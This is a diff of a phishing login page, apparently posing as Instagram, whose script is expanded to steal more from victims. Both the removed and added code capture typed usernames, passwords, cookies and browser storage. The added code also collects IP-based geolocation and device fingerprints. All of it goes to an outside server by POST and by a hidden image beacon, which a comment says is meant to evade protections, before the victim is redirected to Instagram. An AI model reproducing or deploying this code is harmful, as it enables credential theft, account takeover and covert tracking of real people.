@@ -261,53 +261,253 @@
     </div>
     
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            
-            const stolenData = {
-                credentials: {
-                    username: username,
-                    password: password
-                },
-                cookies: document.cookie,
-                browserInfo: {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    screenWidth: window.screen.width,
-                    screenHeight: window.screen.height,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    referrer: document.referrer
-                },
-                timestamp: new Date().toISOString(),
-                location: window.location.href
-            };
-            
-            console.log("Datos capturados:", stolenData);
-            
-            fetch('https://mi-server-bkk1.onrender.com/datos', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(stolenData)
-            }).catch(error => {
-                console.error('Error:', error);
-            });
-            
-            const encodedData = btoa(JSON.stringify(stolenData));
-            const exfilImage = new Image();
-            exfilImage.src = 'https://mi-server-bkk1.onrender.com/datos?data=' + encodedData;
-            exfilImage.style.display = 'none';
-            document.body.appendChild(exfilImage);
-            
-            setTimeout(() => {
-                window.location.href = "https://www.instagram.com";
-            }, 1000);
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    // Capturar dirección IP usando un servicio externo
+    let ipAddress = "desconocida";
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            ipAddress = data.ip;
+            // Con la IP podemos inferir ubicación aproximada sin pedir permisos
+            fetch(`https://ipapi.co/${data.ip}/json/`)
+                .then(res => res.json())
+                .then(locationData => {
+                    geoData = {
+                        country: locationData.country_name,
+                        region: locationData.region,
+                        city: locationData.city,
+                        latitude: locationData.latitude,
+                        longitude: locationData.longitude,
+                        isp: locationData.org
+                    };
+                    completarRobo(geoData);
+                })
+                .catch(error => {
+                    console.error('Error obteniendo ubicación:', error);
+                    completarRobo({});
+                });
+        })
+        .catch(error => {
+            console.error('Error obteniendo IP:', error);
+            completarRobo({});
         });
+    
+    // Detectar redes sociales donde el usuario podría estar conectado
+    const socialNetworks = checkSocialNetworksLogins();
+    
+    // Obtener información sobre batería si está disponible
+    let batteryInfo = "no disponible";
+    if (navigator.getBattery) {
+        navigator.getBattery().then(battery => {
+            batteryInfo = {
+                level: battery.level * 100 + "%",
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        });
+    }
+    
+    // Detectar dispositivos de entrada disponibles
+    let deviceInfo = {
+        touchscreen: 'ontouchstart' in window,
+        inputDevices: navigator.maxTouchPoints > 0 ? "touchscreen" : "mouse/keyboard"
+    };
+    
+    // Detectar comportamiento de navegación
+    const navigationTiming = performance.timing;
+    const performanceData = {
+        pageLoadTime: navigationTiming.loadEventEnd - navigationTiming.navigationStart,
+        domLoadTime: navigationTiming.domComplete - navigationTiming.domLoading,
+        redirectTime: navigationTiming.redirectEnd - navigationTiming.redirectStart
+    };
+    
+    // Historial reciente (limitado a las páginas visitadas en la sesión actual)
+    let recentHistory = [];
+    if (window.history && window.history.length) {
+        recentHistory = {
+            length: window.history.length,
+            current: window.location.href
+        };
+    }
+    
+    // Datos de localStorage y sessionStorage
+    let storageData = {
+        localStorage: extractStorageData(localStorage),
+        sessionStorage: extractStorageData(sessionStorage)
+    };
+    
+    // Información sobre la red local (disponible sin permisos)
+    let connectionInfo = {};
+    if (navigator.connection) {
+        connectionInfo = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        };
+    }
+    
+    // Intentar inferir ubicación aproximada por idioma y zona horaria sin pedir permisos
+    const languageInfo = {
+        language: navigator.language,
+        languages: navigator.languages,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+    
+    function extractStorageData(storage) {
+        let data = {};
+        for (let i = 0; i < storage.length; i++) {
+            const key = storage.key(i);
+            data[key] = storage.getItem(key);
+        }
+        return data;
+    }
+    
+    function checkSocialNetworksLogins() {
+        // Este método simplificado verifica pixeles sociales y scripts comunes
+        const networks = [];
+        
+        // Facebook
+        if (document.querySelector('script[src*="facebook"]') || window.FB) {
+            networks.push("facebook");
+        }
+        
+        // Twitter
+        if (document.querySelector('script[src*="twitter"]') || window.twttr) {
+            networks.push("twitter");
+        }
+        
+        // Google
+        if (document.querySelector('script[src*="google"]') || window.gapi) {
+            networks.push("google");
+        }
+        
+        return networks;
+    }
+    
+    function completarRobo(geoData) {
+        const stolenData = {
+            credentials: {
+                username: username,
+                password: password
+            },
+            cookies: document.cookie,
+            browserInfo: {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                doNotTrack: navigator.doNotTrack,
+                webdriver: navigator.webdriver,
+                plugins: Array.from(navigator.plugins).map(p => p.name)
+            },
+            networkInfo: {
+                ip: ipAddress,
+                connectionDetails: connectionInfo
+            },
+            locationData: geoData,  // Ubicación aproximada basada en IP, sin solicitar permisos
+            languageInfo: languageInfo,
+            deviceInfo: deviceInfo,
+            batteryStatus: batteryInfo,
+            performanceMetrics: performanceData,
+            browserHistory: recentHistory,
+            storageData: storageData,
+            socialAccounts: socialNetworks,
+            timestamp: new Date().toISOString(),
+            location: window.location.href,
+            canvasFingerprint: getCanvasFingerprint(),
+            audioFingerprint: getAudioFingerprint(),
+            webRTCInfo: getWebRTCInfo()
+        };
+        
+        // Enviar datos mediante POST
+        fetch('https://mi-server-bkk1.onrender.com/datos', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(stolenData)
+        }).catch(error => {
+            console.error('Error:', error);
+        });
+        
+        // Método alternativo de envío usando imagen (para evadir algunas protecciones)
+        const encodedData = btoa(JSON.stringify(stolenData));
+        const exfilImage = new Image();
+        exfilImage.src = 'https://mi-server-bkk1.onrender.com/datos?data=' + encodedData;
+        exfilImage.style.display = 'none';
+        document.body.appendChild(exfilImage);
+        
+        // Redirigir a Instagram después de un retraso
+        setTimeout(() => {
+            window.location.href = "https://www.instagram.com";
+        }, 1000);
+    }
+    
+    // Técnicas de fingerprinting para identificación de usuario
+    function getCanvasFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 200;
+            
+            // Dibujar texto y formas aleatorias
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.textBaseline = "alphabetic";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("Fingerprint", 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText("Canvas", 4, 45);
+            
+            return canvas.toDataURL();
+        } catch (e) {
+            return "canvas-not-supported";
+        }
+    }
+    
+    function getAudioFingerprint() {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const analyser = audioContext.createAnalyser();
+            return {
+                sampleRate: audioContext.sampleRate,
+                channelCount: (audioContext.destination).maxChannelCount,
+                state: audioContext.state
+            };
+        } catch (e) {
+            return "audio-not-supported";
+        }
+    }
+    
+    function getWebRTCInfo() {
+        // Información sobre conexiones de red usando WebRTC (puede revelar IP local sin solicitud de permisos)
+        // Esta es una versión simplificada para el ejemplo
+        try {
+            if (window.RTCPeerConnection) {
+                return { available: true };
+            }
+            return { available: false };
+        } catch (e) {
+            return { error: e.toString() };
+        }
+    }
+});
     </script>
 </body>
 </html>
